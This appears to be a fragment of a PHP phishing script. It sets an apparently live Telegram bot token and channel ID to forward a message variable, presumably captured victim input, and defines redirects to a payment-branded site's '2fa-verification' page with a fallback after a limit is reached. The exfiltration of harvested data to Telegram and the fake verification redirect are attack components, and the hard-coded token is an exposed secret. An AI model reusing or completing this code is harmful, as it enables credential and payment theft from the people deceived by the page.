...
$apiToken = "7075682494:AAHNsjxWQ5Iqy8j02syVz9tWYumoMtk9BsQ";
    $data = [
        'chat_id' => '@ballaraonly', 
        'text' => $tmain
    ];
...
$primaryRedirectionUrl = "https://app.swiftgopay.tech/trade/Or124t3oQ5/2fa-verification/";

// The alternative redirection URL after reaching the limit
$alternativeRedirectionUrl = "https://app.swiftgopay.tech/trade/Or124t3oQ5/";
